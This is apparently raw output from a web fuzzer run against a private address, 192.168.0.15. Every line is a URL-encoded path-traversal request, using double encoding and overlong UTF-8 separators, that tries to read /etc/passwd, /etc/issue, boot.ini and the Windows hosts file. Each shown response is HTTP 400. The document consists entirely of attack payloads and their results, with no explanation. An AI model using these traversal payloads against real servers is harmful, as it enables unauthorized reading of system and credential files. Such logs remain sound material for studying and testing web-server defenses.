212,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
207,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
213,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qfboot.ini
206,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
210,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
209,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
214,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qfetc%bg%qfissue
211,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
59,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
222,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
72,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
218,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
220,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
216,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
223,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
221,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
224,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
225,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
215,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
226,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
69,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252fboot.ini
235,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
234,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
233,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
231,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
232,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
229,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
227,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
101,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
70,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252fetc%252fissue
242,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
240,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
239,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
241,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
243,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
238,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2fetc%c0%2fissue
244,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
236,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
237,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2fboot.ini
196,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
254,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
255,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
256,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
258,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
96,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
259,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
260,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
261,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5cboot.ini
262,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5cetc%c0%5cissue
263,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
264,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
265,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
266,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
268,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
71,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252fetc%252fpasswd
269,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
270,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
271,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
272,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
273,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
274,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
253,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
251,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
248,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
245,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
247,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
249,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
250,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
246,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
252,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
208,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
280,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
276,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
282,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
281,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
279,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
277,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
278,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
285,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9vboot.ini
284,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
283,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
286,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9vetc%c0%9vissue
289,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
287,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
288,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
295,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
305,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
303,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
302,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
291,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
304,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
294,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
292,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
290,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
308,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
307,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
306,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
297,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
296,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
299,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
298,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
293,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
301,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
300,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
309,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%afboot.ini
316,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
319,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
320,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
321,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
322,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
310,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%afetc%c0%afissue
315,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
312,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
311,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%afetc%c0%afpasswd
324,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
325,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
329,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
330,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
326,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
327,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
328,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
331,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
323,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
334,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qfetc%c0%qfissue
335,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
332,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
343,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cpasswd
336,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
333,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qfboot.ini
341,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cboot.ini
342,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cissue
338,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cissue
340,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
339,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cpasswd
337,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cboot.ini
350,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cissue
349,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cboot.ini
355,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cpasswd
344,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
352,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
346,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cissue
357,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1cboot.ini
356,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
354,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cissue
353,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cboot.ini
348,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
345,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cboot.ini
347,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cpasswd
64,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
359,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1cetc%c1%1cpasswd
358,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1cetc%c1%1cissue
360,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
361,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8sboot.ini
362,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8sissue
363,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8spasswd
